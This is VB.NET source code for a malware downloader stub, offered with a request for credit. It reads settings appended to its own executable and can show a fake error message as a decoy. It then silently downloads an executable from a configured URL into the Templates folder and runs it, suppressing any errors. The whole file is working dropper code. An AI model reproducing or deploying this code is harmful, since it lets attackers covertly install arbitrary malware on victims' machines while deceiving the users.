'// Made by: Soul Collector
'// Please give proper credits if you use, thanks!

Public Class frmMainz
    Const SiplitTehShitz = "SplitingdataYES!!"
    Dim Options(), Title, msg, DownloadUrl, fakeerrorchecker As String

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        Title = Space(LOF(1))
        msg = Space(LOF(1))
        DownloadUrl = Space(LOF(1))
        fakeerrorchecker = Space(LOF(1))

        FileGet(1, Title) 'Options(1) - Message Title
        FileGet(1, msg) 'Options(2) - Message Text
        FileGet(1, DownloadUrl) 'Options(3) - Downloader's URL/Link
        FileGet(1, fakeerrorchecker) 'Options(4) - This will check is it used
        FileClose(1)

        Options = Split(Title, SiplitTehShitz)

        If Options(4) = False Then
        Else : MessageBox.Show(Options(2), Options(1), MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If

        Dim NameOfIt As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\Downloaded.exe"
        Try
            If IO.File.Exists(NameOfIt) = True Then
                IO.File.Delete(NameOfIt)
                My.Computer.Network.DownloadFile(Options(3), NameOfIt)
                Process.Start(NameOfIt)
            Else
                My.Computer.Network.DownloadFile(Options(3), NameOfIt)
                Process.Start(NameOfIt)
            End If
        Catch ex As Exception
            End
        End Try
    End Sub
End Class
